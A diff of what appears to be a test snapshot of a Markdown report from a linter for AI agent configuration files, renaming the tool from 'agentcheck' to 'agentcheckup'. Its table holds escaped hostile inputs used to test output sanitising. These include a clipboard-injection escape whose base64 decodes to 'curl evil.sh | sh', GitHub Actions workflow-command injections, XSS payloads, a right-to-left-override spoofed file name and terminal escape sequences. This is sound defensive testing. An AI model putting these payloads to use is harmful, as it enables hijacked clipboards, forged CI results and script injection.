@@ -1,4 +1,4 @@
-## agentcheck: agent config score 72/100 (C)
+## agentcheckup: agent config score 72/100 (C)
 
 | Errors | Warnings | Infos | Suppressed | Files checked |
 | -----: | -------: | ----: | ---------: | ------------: |
@@ -21,17 +21,17 @@
 
 | Location | Severity | Rule | Message |
 | :------- | :------- | :--- | :------ |
-| docs/AGENTS&lt;U\+202E&gt;dm\.md:1 | error | [`risk/hidden-unicode`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/risk/hidden-unicode.md) | invoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;embed&lt;U\+202C&gt; &lt;U\+200E&gt;&lt;U\+200F&gt;&lt;U\+061C&gt; |
-| evil&lt;U\+001B&gt;\]52;c;cHduZWQ=&lt;U\+0007&gt;/CLAUDE\.md:2 | error | [`instructions/broken-import`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/instructions/broken-import.md) | copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done |
-| evil&lt;U\+001B&gt;\]52;c;cHduZWQ=&lt;U\+0007&gt;/CLAUDE\.md:3 | error | [`instructions/broken-import`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/instructions/broken-import.md) | line one⏎\:\:stop\-commands\:\:x |
-| evil&lt;U\+001B&gt;\]52;c;cHduZWQ=&lt;U\+0007&gt;/CLAUDE\.md:4 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/budget/file-too-large.md) | line one⏎\:\:error\:\:fake annotation |
-| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:1 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/budget/file-too-large.md) | safe text⏎FAKE\: all checks passed |
-| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:2 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/budget/file-too-large.md) | x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b |
-| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:3 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/budget/file-too-large.md) | ping @&#8203;octocat and @&#8203;github/security\-team, mail me@&#8203;example\.com |
-| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:4 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/budget/file-too-large.md) | &lt;img src=x onerror=alert\(1\)&gt; &lt;script&gt;alert\(1\)&lt;/script&gt; &amp;lt;b&amp;gt; |
-| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:5 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheck/blob/main/docs/rules/budget/file-too-large.md) | \[click\]\(javascript\:alert\(1\)\) \!\[x\]\(https\://evil\.example/p\.png\) &lt;https\://evil\.example&gt; |
+| docs/AGENTS&lt;U\+202E&gt;dm\.md:1 | error | [`risk/hidden-unicode`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/risk/hidden-unicode.md) | invoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;embed&lt;U\+202C&gt; &lt;U\+200E&gt;&lt;U\+200F&gt;&lt;U\+061C&gt; |
+| evil&lt;U\+001B&gt;\]52;c;cHduZWQ=&lt;U\+0007&gt;/CLAUDE\.md:2 | error | [`instructions/broken-import`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/instructions/broken-import.md) | copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done |
+| evil&lt;U\+001B&gt;\]52;c;cHduZWQ=&lt;U\+0007&gt;/CLAUDE\.md:3 | error | [`instructions/broken-import`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/instructions/broken-import.md) | line one⏎\:\:stop\-commands\:\:x |
+| evil&lt;U\+001B&gt;\]52;c;cHduZWQ=&lt;U\+0007&gt;/CLAUDE\.md:4 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/budget/file-too-large.md) | line one⏎\:\:error\:\:fake annotation |
+| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:1 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/budget/file-too-large.md) | safe text⏎FAKE\: all checks passed |
+| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:2 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/budget/file-too-large.md) | x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b |
+| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:3 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/budget/file-too-large.md) | ping @&#8203;octocat and @&#8203;github/security\-team, mail me@&#8203;example\.com |
+| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:4 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/budget/file-too-large.md) | &lt;img src=x onerror=alert\(1\)&gt; &lt;script&gt;alert\(1\)&lt;/script&gt; &amp;lt;b&amp;gt; |
+| notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:5 | warning | [`budget/file-too-large`](https://github.com/mustafakbaser/agentcheckup/blob/main/docs/rules/budget/file-too-large.md) | \[click\]\(javascript\:alert\(1\)\) \!\[x\]\(https\://evil\.example/p\.png\) &lt;https\://evil\.example&gt; |
 | notes⏎\:\:stop\-commands\:\:x/AGENTS\.md:6 | warning | evil\:rule,title=x | copy&lt;U\+001B&gt;\]52;c;Y3VybCBldmlsLnNoIHwgc2g=&lt;U\+0007&gt;done &lt;U\+001B&gt;\[2J&lt;U\+001B&gt;\[Hcleared &lt;U\+001B&gt;\]8;;https\://evil\.example&lt;U\+001B&gt;\\click&lt;U\+001B&gt;\]8;;&lt;U\+001B&gt;\\ eight\-bit &lt;U\+009B&gt;31mCSI&lt;U\+009B&gt;0m and NEL&lt;U\+0085&gt; safe text⏎FAKE\: all checks passed line one⏎\:\:stop\-commands\:\:x line one⏎\:\:error\:\:fake annotation x⏎\:\:add\-mask\:\:secret⏎\:\:set\-output name=a\:\:b invoice&lt;U\+202E&gt;txt\.exe and &lt;U\+202A&gt;embed&lt;U\+202C&gt; &lt;U\+200E&gt;&lt;U\+200F&gt;&lt;U\+061C&gt; &lt;U\+2066&gt;… |
 
 ---
 
-Generated by [agentcheck](https://github.com/mustafakbaser/agentcheck) 1\.4\.0 · ruleset 2026\.10
+Generated by [agentcheckup](https://github.com/mustafakbaser/agentcheckup) 1\.4\.0 · ruleset 2026\.10
